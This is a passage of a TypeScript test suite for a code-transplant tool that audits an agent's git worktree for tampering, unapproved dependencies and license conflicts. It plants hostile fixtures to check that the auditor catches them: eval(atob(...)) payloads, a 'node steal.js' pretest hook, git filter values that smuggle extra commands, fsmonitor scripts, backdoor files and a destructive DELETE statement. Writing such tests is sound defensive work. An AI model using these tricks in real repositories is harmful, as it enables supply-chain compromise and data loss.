    const { id, worktree } = await workspaceFor(planWith(), {
      ...TARGET,
      "scripts/guard.sh": "# check\necho GUARD\n",
    });
    writeFiles(worktree, IMPLEMENTATION);
    writeFiles(worktree, { "scripts/guard.sh": "# check\r\necho GUARD\r\n" });
    await auditSession(config, id);
    expect((await loadSession(config, id)).audit!.findings.map((item) => item.file)).not.toContain(
      "scripts/guard.sh",
    );
    writeFiles(worktree, { "scripts/guard.sh": "# check\recho GUARD\n" });
    await auditSession(config, id);
    expect((await loadSession(config, id)).audit!.findings.map((item) => item.file)).toContain(
      "scripts/guard.sh",
    );
  });

  it("sees a repository planted at a submodule path", async () => {
    const target = createRepo(TARGET);
    const inner = createRepo({ "lib.js": "1\n" });
    const sha = gitIn(inner, "rev-parse", "HEAD").trim();
    gitIn(target, "update-index", "--add", "--cacheinfo", `160000,${sha},vendor/sub`);
    gitIn(target, "commit", "-q", "-m", "submodule");
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const session = await startSession(config, {
      snapshot_id: snapshot.id,
      target_path: target,
      feature: "A",
    });
    await traceSession(config, session.id, { seeds: ["src/a.js"] });
    await recordSpec(config, session.id, SPEC);
    const planned = await recordPlan(config, session.id, planWith());
    await approvePlan(config, session.id, {
      plan_hash: planned.planHash!,
      user_confirmation: "yes",
      via: "agent_attested",
    });
    const opened = await openWorkspace(config, session.id);
    const worktree = opened.workspace!.path;
    writeFiles(worktree, { ...IMPLEMENTATION, "vendor/sub/evil.js": "bad\n" });
    gitIn(path.join(worktree, "vendor/sub"), "init", "-q");
    expect(await auditRules(session.id)).toEqual(expect.arrayContaining(["scope.nested_repository"]));
    const audited = await loadSession(config, session.id);
    expect(audited.audit!.findings.map((item) => item.file)).toContain("vendor/sub/evil.js");
  });

  it("does not exempt lockfiles or env templates that hold code", async () => {
    const withDep = planWith({
      dependencies: { add: [{ name: "left-pad", version: "1.3.0", ecosystem: "npm", reason: "x" }] },
    });
    const { id, worktree } = await workspaceFor(withDep);
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "yarn.lock": "require('./steal');\n",
      ".env.example": "module.exports = process.env;\n",
    });
    await auditSession(config, id);
    const files = (await loadSession(config, id))
      .audit!.findings.filter((item) => item.rule === "scope.unplanned_file")
      .map((item) => item.file);
    expect(files).toEqual(expect.arrayContaining(["yarn.lock", ".env.example"]));
  });

  it("flags a lockfile when no package was approved", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "package-lock.json": "{}" });
    expect(await auditRules(id)).toContain("scope.unplanned_file");
  });

  it("keeps a real lockfile exempt when packages were approved", async () => {
    const withDep = planWith({
      dependencies: { add: [{ name: "left-pad", version: "1.3.0", ecosystem: "npm", reason: "x" }] },
    });
    const { id, worktree } = await workspaceFor(withDep);
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "package.json":
        '{"name":"t","private":true,"scripts":{"test":"node --test"},"dependencies":{"left-pad":"1.3.0"}}',
      "yarn.lock":
        '# yarn lockfile v1\n\nleft-pad@1.3.0:\n  version "1.3.0"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n',
    });
    await auditSession(config, id);
    expect((await loadSession(config, id)).audit!.findings).toEqual([]);
  });

  it.each([
    ["Gemfile", "gem 'rack'\n", "gem 'rack'\nsystem('node x.js') # rack\n"],
    [
      "Cargo.toml",
      '[package]\nname = "a"\n[dependencies]\nserde = "1"\n',
      '[package]\nname = "a"\nbuild="src/a.js" # serde\n[dependencies]\nserde = "1"\n',
    ],
  ])("reads only the leading token of a %s line", async (file, before, after) => {
    const { id, worktree } = await workspaceFor(planWith(), { ...TARGET, [file]: before });
    writeFiles(worktree, { ...IMPLEMENTATION, [file]: after });
    expect(await auditRules(id)).toContain("manifest.unplanned_change");
  });

  it("does not take the shared index's word for what is tracked", async () => {
    const { id, worktree, repo } = await workspaceFor();
    writeFiles(repo, { "dist/app.js": "main\n" });
    gitIn(repo, "add", "-f", "dist/app.js");
    writeFiles(worktree, { ...IMPLEMENTATION, "dist/app.js": "bad\n" });
    await auditSession(config, id);
    expect((await loadSession(config, id)).audit!.findings.map((item) => item.file)).toContain("dist/app.js");
  });

  it("ignores git replace refs when reading the base", async () => {
    const { id, worktree, repo, workspace } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/auth.js": "eval(atob(payload));\n" });
    const fake = createRepo({ ...TARGET, "src/auth.js": "eval(atob(payload));\n" });
    gitIn(repo, "fetch", "-q", fake, "main");
    const commit = gitIn(repo, "rev-parse", "FETCH_HEAD").trim();
    gitIn(repo, "replace", workspace.baseSha, commit);
    expect(await auditRules(id)).toContain("exec.eval_decoded");
  });

  it("flags changes to git settings made during the session", async () => {
    const { id, worktree, repo } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    expect(await auditRules(id)).not.toContain("repository.git_state_changed");
    gitIn(repo, "config", "filter.x.clean", "cat");
    writeFiles(path.join(repo, ".git", "hooks"), { "pre-commit": "#!/bin/sh\n" });
    expect(await auditRules(id)).toContain("repository.git_state_changed");
  });

  it("flags a symlink even when the plan lists it", async () => {
    const plan = planWith({
      files: [
        ...planWith().files,
        { path: "src/link.js", action: "create", purpose: "Link", acceptance_criteria: [] },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, IMPLEMENTATION);
    gitIn(worktree, "config", "core.symlinks", "true");
    try {
      symlinkSync("a.js", path.join(worktree, "src/link.js"));
    } catch {
      return; // Windows needs developer mode for symlinks.
    }
    expect(await auditRules(id)).toContain("scope.symlink");
  });
});

describe("approval integrity", () => {
  it("makes the base commit part of what is approved", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const repo = createRepo(TARGET);
    const session = await startSession(config, { snapshot_id: snapshot.id, target_path: repo, feature: "A" });
    await traceSession(config, session.id, { seeds: ["src/a.js"] });
    await recordSpec(config, session.id, SPEC);
    const first = await recordPlan(config, session.id, planWith());
    writeFiles(repo, { "src/backdoor.js": "x\n" });
    gitIn(repo, "add", "-A");
    gitIn(repo, "commit", "-q", "-m", "unapproved");
    const second = await recordPlan(config, session.id, planWith());
    expect(second.planHash).not.toBe(first.planHash);
    await approvePlan(config, session.id, {
      plan_hash: second.planHash!,
      user_confirmation: "y1",
      via: "agent_attested",
    });
    writeFiles(repo, { "src/later.js": "x\n" });
    gitIn(repo, "add", "-A");
    gitIn(repo, "commit", "-q", "-m", "later");
    const opened = await openWorkspace(config, session.id);
    expect(opened.workspace?.baseSha).toBe(second.target.baseSha);
    expect(existsSync(path.join(opened.workspace!.path, "src/later.js"))).toBe(false);
  });

  it("will not accept findings the audit never raised, and labels who accepted", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/extra.js": "x\n" });
    await expect(auditSession(config, id, [{ finding_id: "nope", reason: "because" }])).rejects.toMatchObject(
      {
        code: "unknown_finding",
      },
    );
    const first = await auditSession(config, id);
    const finding = first.session.audit!.findings[0]!;
    const second = await auditSession(config, id, [{ finding_id: finding.id, reason: "user said so" }]);
    expect(second.session.audit!.findings[0]?.acknowledged).toBe("user said so (recorded by the agent)");
  });

  it("normalizes a target given as a subdirectory", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const repo = createRepo(TARGET);
    const session = await startSession(config, {
      snapshot_id: snapshot.id,
      target_path: path.join(repo, "src"),
      feature: "A",
    });
    expect(path.basename(session.target.path)).toBe(path.basename(repo));
  });
});

describe("fetching", () => {
  it("rejects a subdirectory that climbs out of the snapshot", async () => {
    const repo = createRepo(SOURCE);
    await expect(
      fetchSnapshot(parseSource(repo, config, true), config, { subdir: "../../../../x" }),
    ).rejects.toMatchObject({ code: "unsafe_path" });
  });

  it("keeps snapshots of different subdirectories apart", async () => {
    const repo = createRepo({ ...SOURCE, "a/x.js": "1", "b/y.js": "2" });
    const first = await fetchSnapshot(parseSource(repo, config, true), config, { subdir: "a" });
    const second = await fetchSnapshot(parseSource(repo, config, true), config, { subdir: "b" });
    expect(first.id).not.toBe(second.id);
  });

  it("records the commit behind an annotated tag", async () => {
    const repo = createRepo(SOURCE);
    gitIn(repo, "-c", "user.name=a", "-c", "user.email=a@b", "tag", "-a", "v1", "-m", "one");
    const snapshot = await fetchSnapshot(parseSource(repo, config, true), config, { ref: "v1" });
    expect(snapshot.sha).toBe(gitIn(repo, "rev-parse", "HEAD").trim());
  });

  it("enforces the size limit before checkout", async () => {
    const repo = createRepo({ ...SOURCE, "big.txt": "x".repeat(3 * 1024 * 1024) });
    await expect(
      fetchSnapshot(parseSource(repo, { ...config, maxRepoMb: 1 }, true), { ...config, maxRepoMb: 1 }),
    ).rejects.toMatchObject({
      code: "repo_too_large",
    });
  });

  it("does not trust provenance to enable local sources or other hosts", async () => {
    const record = {
      schema: 1,
      session_id: "x",
      source: { url: "https://evil.example/a/b", sha: "a".repeat(40), ref: "HEAD" },
      license: { spdx: "MIT" },
      file_map: [],
      source_files: [],
    } as never;
    await expect(checkUpstream(record, config)).rejects.toMatchObject({ code: "host_not_allowed" });
    const local = {
      ...(record as object),
      source: { url: path.resolve("some/dir"), sha: "a", ref: "HEAD" },
    } as never;
    await expect(checkUpstream(local, config)).rejects.toMatchObject({ code: "invalid_source" });
  });
});

describe("license accuracy", () => {
  const proprietary = (() => {
    const root = tempDir();
    writeFiles(root, { "package.json": '{"private":true}' });
    return root;
  })();
  const repo = (files: Record<string, string>): string => {
    const root = tempDir();
    writeFiles(root, files);
    return root;
  };
  const verdict = async (files: Record<string, string>, paths?: string[]) =>
    (await checkLicense(repo(files), proprietary, { maxFileBytes: MAX, paths })).verdict;

  it("reads the full GPL-3 text as GPL, despite its section on the Affero license", () => {
    const full = `${GPL3_TEXT}\n${"terms ".repeat(400)}\n13. Use with the GNU Affero General Public License.\n`;
    expect(identifyLicenseText(full)).toBe("GPL-3.0");
  });

  it("sends disagreements between text and manifest to a person", async () => {
    expect(
      await verdict({ LICENSE: "Our own restrictive terms.", "package.json": '{"license":"MIT"}' }),
    ).toBe("needs_review");
    expect(
      await verdict({
        LICENSE: "Business Source License 1.1",
        "package.json": '{"license":"MIT OR Apache-2.0"}',
      }),
    ).toBe("block");
    const report = await checkLicense(
      repo({ LICENSE: GPL3_TEXT, "package.json": '{"license":"MIT"}' }),
      proprietary,
      { maxFileBytes: MAX },
    );
    expect(report.source.conflict).toContain("GPL-3.0");
    expect(report.verdict).toBe("block");
  });

  it("respects precedence and parentheses in SPDX expressions", () => {
    expect(resolveExpression("(MIT OR Apache-2.0) AND GPL-3.0").spdx).toBe("GPL-3.0");
    expect(resolveExpression("MIT OR Apache-2.0 AND GPL-3.0").spdx).toBe("MIT");
    expect(resolveExpression("GPL-2.0 WITH Classpath-exception-2.0").spdx).toBe("GPL-2.0");
  });

  it("reads the manifest nearest the code", async () => {
    const source = repo({
      LICENSE: MIT_TEXT,
      "packages/a/package.json": '{"license":"GPL-3.0"}',
      "packages/a/x.js": "1",
    });
    const report = await checkLicense(source, proprietary, { maxFileBytes: MAX, subdir: "packages/a" });
    expect(report.source.conflict).toContain("GPL-3.0");
    expect(report.verdict).toBe("needs_review");
  });

  it("judges every file override", async () => {
    const files: Record<string, string> = { LICENSE: MIT_TEXT };
    for (let i = 0; i < 60; i++)
      files[`src/a${String(i).padStart(2, "0")}.js`] = "// SPDX-License-Identifier: ISC\n";
    files["src/z.js"] = "// SPDX-License-Identifier: GPL-3.0-only\n";
    expect(
      await verdict(
        files,
        Object.keys(files).filter((name) => name.startsWith("src/")),
      ),
    ).toBe("block");
  });

  it("reads every license file in a dual-licensed repository", async () => {
    const report = await checkLicense(
      repo({
        "LICENSE-APACHE": "Apache License\nVersion 2.0",
        "LICENSE-MIT": MIT_TEXT,
        "Cargo.toml": 'license = "MIT OR Apache-2.0"\n',
      }),
      proprietary,
      { maxFileBytes: MAX },
    );
    expect(report.source.conflict).toBeNull();
    expect(report.verdict).toBe("allow_with_conditions");
  });
});

describe("analysis robustness", () => {
  it("survives hostile text in reasonable time", async () => {
    const huge = 1024 * 1024;
    const inputs: [string, string][] = [
      ["a.py", "class A(Base\n".repeat(huge / 13)],
      ["b.py", `${"from x import (\n".repeat(huge / 16)}`],
      ["c.js", `${"import ".repeat(huge / 7)}/*`],
      ["d.vue", "<script ".repeat(huge / 8)],
      ["e.go", "import (\n".repeat(huge / 9)],
      ["f.py", "x = APIRouter(".repeat(huge / 14)],
    ];
    const root = tempDir();
    writeFiles(root, Object.fromEntries(inputs));
    const started = Date.now();
    for (const [rel, text] of inputs) extractImports(rel, text);
    const graph = await buildGraph(root, 2 * huge, { useCache: false });
    scanBackend(graph);
    await scanRepository(root, { maxFileBytes: 2 * huge });
    expect(Date.now() - started).toBeLessThan(15_000);
  });

  it("scans within a very long line, and notes files it skipped", async () => {
    expect(scanText("src/a.js", `eval(atob(x)); ${"y".repeat(30_000)}`).map((item) => item.rule)).toContain(
      "exec.eval_decoded",
    );
    const root = tempDir();
    writeFiles(root, { "src/big.js": "x".repeat(2000) });
    const report = await scanRepository(root, { maxFileBytes: 1000 });
    expect(report.findings[0]?.rule).toBe("coverage.file_too_large");
  });

  it("does not drop vendored or build-named directories inside source", async () => {
    const root = tempDir();
    writeFiles(root, {
      "package.json": "{}",
      "src/vendor/a.js": "1",
      "src/build/b.js": "2",
      "vendor/c.js": "3",
      "dist/d.js": "4",
      "third_party/e.js": "eval(atob(x))",
      ".vscode/mcp.json": "{}",
    });
    const normal = (await walkRepo(root)).map((file) => file.rel);
    expect(normal).toEqual(expect.arrayContaining(["src/vendor/a.js", "src/build/b.js"]));
    expect(normal).not.toEqual(expect.arrayContaining(["vendor/c.js"]));
    const report = await scanRepository(root, { maxFileBytes: MAX });
    expect(report.risk).toBe("dangerous");
    expect(report.do_not_copy).toContain(".vscode/mcp.json");
  });

  it("handles valid config shapes that once crashed the graph", async () => {
    const root = tempDir();
    writeFiles(root, {
      "composer.json": '{"autoload":{"psr-4":{"App\\\\":["src/","lib/"]}}}',
      "tsconfig.json": '{"compilerOptions":{"baseUrl":".","paths":{"*":5}}}',
      "src/a.php": "<?php\nuse App\\B;\n",
      "lib/B.php": "<?php\n",
    });
    const graph = await buildGraph(root, MAX, { useCache: false });
    expect([...graph.nodes.get("src/a.php")!.internal]).toEqual(["lib/B.php"]);
  });

  it("reads CRLF sources and TSX behind a .js import", async () => {
    const root = tempDir();
    writeFiles(root, {
      "a.py": "from .b import (\r\n  c,\r\n)\r\nimport d\r\n",
      "b.py": "",
      "page.astro": "---\r\nimport X from './x';\r\n---\r\n<div/>",
      "src/a.ts": `import "./Button.js"; import "./types.js";`,
      "src/Button.tsx": "",
      "src/types.d.ts": "",
    });
    const graph = await buildGraph(root, MAX, { useCache: false });
    expect([...graph.nodes.get("a.py")!.internal]).toEqual(["b.py"]);
    expect([...graph.nodes.get("a.py")!.external]).toEqual(["d"]);
    expect([...graph.nodes.get("src/a.ts")!.internal].sort()).toEqual(["src/Button.tsx", "src/types.d.ts"]);
    expect(extractImports("page.astro", "---\r\nimport X from './x';\r\n---\r\n<div/>")[0]?.specifier).toBe(
      "./x",
    );
  });

  it("does not report the standard library as packages", async () => {
    const root = tempDir();
    writeFiles(root, {
      "a.py": "import tarfile, configparser, zoneinfo, socketserver, codecs\nimport requests\n",
    });
    const graph = await buildGraph(root, MAX, { useCache: false });
    expect([...graph.nodes.get("a.py")!.external]).toEqual(["requests"]);
  });
});

describe("what reaches a merge without appearing on disk", () => {
  it("blocks commits on the branch, even when the files on disk look untouched", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/backdoor.js": "exports.open = true;\n" });
    gitIn(worktree, "add", "src/backdoor.js");
    gitIn(worktree, "commit", "-qm", "work");
    await rm(path.join(worktree, "src/backdoor.js"));
    expect(await auditRules(id)).toContain("repository.branch_moved");

    gitIn(worktree, "reset", "-q", "--mixed", workspace.baseSha);
    expect(await auditRules(id)).not.toContain("repository.branch_moved");
  });

  it("cannot be waved through by accepting the finding", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    gitIn(worktree, "add", "src/a.js");
    gitIn(worktree, "commit", "-qm", "work");
    const { session } = await auditSession(config, id);
    const finding = session.audit!.findings.find((item) => item.rule === "repository.branch_moved")!;
    const accepted = await auditSession(config, id, [{ finding_id: finding.id, reason: "fine" }]);
    expect(accepted.blocking).toBeGreaterThan(0);
  });

  it("flags a file staged past the ignore rules", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "node_modules/evil/index.js": "module.exports = 1;\n" });
    gitIn(worktree, "add", "-f", "node_modules/evil/index.js");
    expect(await auditRules(id)).toContain("repository.index_changed");
  });

  it("flags staged content that differs from the same file on disk", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, "src/a.js": "exports.value = 'evil';\n" });
    gitIn(worktree, "add", "src/a.js");
    gitIn(worktree, "update-index", "--skip-worktree", "src/a.js");
    writeFiles(worktree, IMPLEMENTATION);
    expect(await auditRules(id)).toContain("repository.index_changed");
  });

  it("flags refs that change what the branch name or an object resolves to", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    gitIn(worktree, "tag", workspace.branch, workspace.baseSha);
    expect(await auditRules(id)).toContain("repository.ref_shadowing");
    gitIn(worktree, "tag", "-d", workspace.branch);
    const clean = gitIn(worktree, "rev-parse", "HEAD:src/app.js").trim();
    const evil = gitIn(worktree, "rev-parse", "HEAD:src/auth.js").trim();
    gitIn(worktree, "replace", clean, evil);
    expect(await auditRules(id)).toContain("repository.ref_shadowing");
  });

  it("reports a branch that moved during the session, without blocking on it", async () => {
    const { id, worktree, repo } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    writeFiles(repo, { "notes.txt": "mine\n" });
    gitIn(repo, "add", "notes.txt");
    gitIn(repo, "commit", "-qm", "mine");
    const { session, blocking } = await auditSession(config, id);
    expect(session.audit!.findings.map((item) => item.rule)).toContain("repository.other_branches_moved");
    expect(blocking).toBe(0);
  });

  it("ignores routine git settings, and a pushed copy of the branch", async () => {
    const { id, worktree, repo, workspace } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    const before = await workspaceFingerprint(workspace);
    gitIn(repo, "config", "user.name", "Someone");
    gitIn(repo, "config", "branch.main.remote", "origin");
    gitIn(repo, "update-ref", `refs/remotes/origin/${workspace.branch}`, workspace.baseSha);
    expect(await workspaceFingerprint(workspace)).toBe(before);
    const rules = await auditRules(id);
    expect(rules).not.toContain("repository.git_state_changed");
    expect(rules).not.toContain("repository.ref_shadowing");
  });

  it("keeps results valid when another branch moves", async () => {
    const { worktree, repo, workspace } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    const before = await workspaceFingerprint(workspace);
    writeFiles(repo, { "notes.txt": "mine\n" });
    gitIn(repo, "add", "notes.txt");
    gitIn(repo, "commit", "-qm", "mine");
    expect(await workspaceFingerprint(workspace)).toBe(before);
  });

  it("will not accept a change to git settings", async () => {
    const { id, worktree, repo } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    gitIn(repo, "config", "core.editor", "./run.sh");
    const { session } = await auditSession(config, id);
    const finding = session.audit!.findings.find((item) => item.rule === "repository.git_state_changed")!;
    expect((await auditSession(config, id, [{ finding_id: finding.id, reason: "fine" }])).blocking).toBe(1);
  });

  it("notices settings changed before the worktree exists", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const repo = createRepo(TARGET);
    const session = await startSession(config, { snapshot_id: snapshot.id, target_path: repo, feature: "A" });
    await traceSession(config, session.id, { seeds: ["src/a.js"] });
    await recordSpec(config, session.id, SPEC);
    const planned = await recordPlan(config, session.id, planWith());
    await approvePlan(config, session.id, {
      plan_hash: planned.planHash!,
      user_confirmation: "yes",
      via: "agent_attested",
    });
    gitIn(repo, "config", "core.fsmonitor", "./monitor.sh");
    await expect(openWorkspace(config, session.id)).rejects.toMatchObject({ code: "git_state_changed" });
  });

  it("reads the worktree's own index even when another worktree took its folder name", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const repo = createRepo(TARGET);
    const head = gitIn(repo, "rev-parse", "HEAD").trim();
    const id = "feature-abcdef";
    gitIn(repo, "worktree", "add", "-q", "--detach", path.join(tempDir("rt-decoy-"), "abcdef"), head);
    const workspace = await createWorkspace(repo, id, head);
    writeFiles(workspace.path, { "node_modules/evil/index.js": "module.exports = 1;\n" });
    gitIn(workspace.path, "add", "-f", "node_modules/evil/index.js");
    expect(path.basename(workspace.adminDir!)).not.toBe("abcdef");
    expect((await reviewTree(workspace)).indexChanged).toBe(true);
    expect(snapshot.id).toBeTruthy();
  });

  it("notices a directory in place of the worktree's .git file", async () => {
    const { id, worktree, workspace } = await workspaceFor();
    writeFiles(worktree, IMPLEMENTATION);
    const before = await workspaceFingerprint(workspace);
    await rm(path.join(worktree, ".git"), { force: true });
    writeFiles(worktree, { ".git/HEAD": "ref: refs/heads/main\n", ".git/config": "[core]\n" });
    expect(await workspaceFingerprint(workspace)).not.toBe(before);
    expect(await auditRules(id)).toContain("repository.git_link_changed");
  });
});

describe("repositories named by path", () => {
  it("does not run the file monitor or hooks, or pass secrets to them", async () => {
    const repo = createRepo(TARGET);
    const marker = path.join(repo, "ran.txt");
    writeFiles(repo, {
      ".git/hooks/post-index-change": `#!/bin/sh\necho hook > "${marker.replaceAll("\\", "/")}"\n`,
      "monitor.sh": `#!/bin/sh\necho monitor > "${marker.replaceAll("\\", "/")}"\n`,
    });
    chmodSync(path.join(repo, ".git/hooks/post-index-change"), 0o755);
    chmodSync(path.join(repo, "monitor.sh"), 0o755);
    gitIn(repo, "config", "core.fsmonitor", "./monitor.sh");
    const state = await readTargetState(repo);
    expect(state.dirty).toBe(true);
    expect(existsSync(marker)).toBe(false);
  });

  it("refuses a repository whose config runs a filter program", async () => {
    const repo = createRepo(TARGET);
    gitIn(repo, "config", "filter.x.clean", "./steal.sh");
    await expect(assertGitRepo(repo)).rejects.toMatchObject({ code: "unsafe_target_config" });
  });

  it("is not fooled by a filter that only looks like LFS", async () => {
    for (const value of [
      "git-lfs x; ./steal.sh; cat #",
      "git-lfs clean -- %f\t./steal.sh",
      "git-lfs a\n./steal.sh",
    ]) {
      const repo = createRepo(TARGET);
      gitIn(repo, "config", "filter.x.clean", value);
      await expect(assertGitRepo(repo)).rejects.toMatchObject({ code: "unsafe_target_config" });
    }
  });

  it("allows Git LFS and the hook managers people really use", async () => {
    const repo = createRepo(TARGET);
    gitIn(repo, "config", "filter.lfs.clean", "git-lfs clean -- %f");
    gitIn(repo, "config", "core.hooksPath", ".husky/_");
    await expect(assertGitRepo(repo)).resolves.toBeTruthy();
  });
});

describe("worktree creation", () => {
  it("uses a short folder and branch, whatever the feature is called", async () => {
    const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
    const session = await startSession(config, {
      snapshot_id: snapshot.id,
      target_path: createRepo(TARGET),
      feature: "A very long feature name that goes on and on and on and on",
    });
    expect(session.id.length).toBeLessThanOrEqual(27);
  });

  it("leaves nothing behind when it fails, so a retry can work", async () => {
    const repo = createRepo(TARGET);
    const head = gitIn(repo, "rev-parse", "HEAD").trim();
    const blocker = path.join(tempDir("rt-file-"), "not-a-folder");
    writeFileSync(blocker, "");
    await expect(createWorkspace(repo, "feature-abcdef", head, { root: blocker })).rejects.toMatchObject({
      code: expect.stringMatching(/worktree_failed|ENOTDIR|EEXIST/),
    });
    expect(gitIn(repo, "branch", "--list", "transplant/*").trim()).toBe("");
  });
});

describe("parsing what the toolchain parses", () => {
  it("reads a package.json with a byte order mark the way npm does", async () => {
    const manifest = JSON.stringify({
      name: "t",
      private: true,
      scripts: { pretest: "node steal.js", test: "node --test" },
      dependencies: { evil: "1.0.0" },
    });
    const plan = planWith({
      files: [
        ...planWith().files,
        { path: "package.json", action: "modify", purpose: "P", acceptance_criteria: ["AC-1"] },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, { ...IMPLEMENTATION, "package.json": `\uFEFF${manifest}` });
    expect(await auditRules(id)).toContain("dependency.unapproved");
  });
});

describe("accepting a finding", () => {
  it("covers the file as it stood, not later versions of it", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, { ...IMPLEMENTATION, ".github/workflows/ci.yml": "# nothing yet\n" });
    const first = await auditSession(config, id);
    const pending = first.session
      .audit!.findings.filter((item) => item.severity === "high")
      .map((item) => ({ finding_id: item.id, reason: "accepted by the user" }));
    expect((await auditSession(config, id, pending)).blocking).toBe(0);

    writeFiles(worktree, { ".github/workflows/ci.yml": "on: push\njobs: {}\n" });
    expect((await auditSession(config, id)).blocking).toBeGreaterThan(0);
  });
});

describe("audit coverage", () => {
  it("reports new code that starts processes, without blocking on it", async () => {
    const { id, worktree } = await workspaceFor();
    writeFiles(worktree, {
      ...IMPLEMENTATION,
      "src/a.js": "require('child_process').exec('ls');\nexports.value = 1;\n",
    });
    const { session, blocking } = await auditSession(config, id);
    expect(session.audit!.findings.map((item) => item.rule)).toContain("exec.child_process");
    expect(blocking).toBe(0);
  });

  it("sees a DELETE with a WHERE clause", async () => {
    const plan = planWith({
      files: [
        ...planWith().files,
        { path: "migrations/1.sql", action: "create", purpose: "M", acceptance_criteria: ["AC-1"] },
      ],
    });
    const { id, worktree } = await workspaceFor(plan);
    writeFiles(worktree, { ...IMPLEMENTATION, "migrations/1.sql": "DELETE FROM users WHERE 1=1;\n" });
    expect(await auditRules(id)).toContain("database.destructive_statement");
  });
});

describe("finding out before approval that checks cannot run", () => {
  const plan = (commands: string[], docker_image?: string) =>
    ({
      verification: { commands: commands.map((command) => ({ command })), docker_image },
    }) as TransplantPlan;
  const env = { PATH: path.dirname(process.execPath), PATHEXT: ".EXE;.CMD" };

  it("names programs that are not installed", () => {
    expect(missingTools(plan(["uv sync --frozen && uv run pytest", "node --test"]), env)).toEqual(["uv"]);
  });

  it("skips paths the checks create, shell words and leading variables", () => {
    const commands = [
      "python-missing -m venv .venv && .venv/bin/python -m pytest",
      "A=1 node -v",
      "cd x && echo y",
    ];
    expect(missingTools(plan(commands), env)).toEqual(["python-missing"]);
  });

  it("does not read shell redirection or options as programs", () => {
    expect(missingTools(plan(["node -v 2>&1 | node -e 1", "env -i node -v"]), env)).toEqual([]);
  });

  it("reads a tool given with its extension, and commands in other shell forms", () => {
    expect(missingTools(plan([path.basename(process.execPath)]), env)).toEqual([]);
    expect(
      missingTools(plan(["env A=1 nope1", "(nope2)", "node -v & nope3", "node -v\nnope4"]), env),
    ).toEqual(["nope1", "nope2", "nope3", "nope4"]);
  });

  it("asks only for Docker when the checks run in a container", () => {
    expect(missingTools(plan(["uv sync"], "python:3.12"), env)).toEqual(["docker"]);
  });
});

describe("committing what was reviewed", () => {
  async function reported(target: Record<string, string> = TARGET) {
    const plan = planWith({
      files: [
        { path: "src/a.js", action: "create", purpose: "A", acceptance_criteria: ["AC-1", "AC-2", "AC-3"] },
        { path: "tests/a.test.js", action: "create", purpose: "T", acceptance_criteria: ["AC-1"] },
        { path: "src/app.js", action: "modify", purpose: "App", acceptance_criteria: ["AC-1"] },
      ],
    });
    const context = await workspaceFor(plan, target);
    writeFiles(context.worktree, IMPLEMENTATION);
    writeFiles(context.worktree, { "src/app.js": "module.exports = 2;\n" });
    await auditSession(config, context.id);
    await verifySession(config, context.id, {});
    await recordEvidence(config, context.id, ALL_EVIDENCE);
    const { result } = await reportSession(config, context.id, false);
    expect(result.status).toBe("complete");
    return context;
  }

  it("builds the commit from the reviewed bytes, report files included", async () => {
    const { id, worktree, repo } = await reported();
    const session = await commitSession(config, id, "Add A");
    const commit = session.workspace!.commit!;
    const show = (rel: string) => gitIn(repo, "show", `${commit}:${rel}`);
    expect(show("src/a.js")).toBe(IMPLEMENTATION["src/a.js"]);
    expect(show("src/app.js")).toBe("module.exports = 2;\n");
    expect(show(`.transplant/reports/${id}.md`)).toContain("complete");
    expect(gitIn(repo, "log", "-1", "--format=%s %an", commit).trim()).toBe("Add A Test");
    expect(gitIn(worktree, "status", "--porcelain").trim()).toBe("");
    gitIn(repo, "merge", "-q", commit);
    expect(readFileSync(path.join(repo, "src/a.js"), "utf8")).toBe(IMPLEMENTATION["src/a.js"]);
    expect((await commitSession(config, id, "Again")).workspace!.commit).toBe(commit);
  });

  it("leaves out anything staged in the worktree's index", async () => {
    const { id, worktree, repo } = await reported();
    writeFiles(worktree, { "node_modules/evil/index.js": "module.exports = 1;\n" });
    gitIn(worktree, "add", "-f", "node_modules/evil/index.js");
    await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "stale_review" });
    gitIn(worktree, "reset", "-q");
    const commit = (await commitSession(config, id, "Add A")).workspace!.commit!;
    expect(gitIn(repo, "ls-tree", "-r", "--name-only", commit)).not.toContain("node_modules");
  });

  it("refuses work changed after the report, or a report that was not complete", async () => {
    const { id, worktree } = await reported();
    writeFiles(worktree, { "src/a.js": "exports.value = 2;\n" });
    await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "stale_review" });

    const other = await workspaceFor();
    writeFiles(other.worktree, IMPLEMENTATION);
    await reportSession(config, other.id, true);
    await expect(commitSession(config, other.id, "Add A")).rejects.toMatchObject({ code: "not_complete" });
  });

  it("keeps an incomplete report from clearing text out of the review", async () => {
    const { id, worktree } = await workspaceFor();
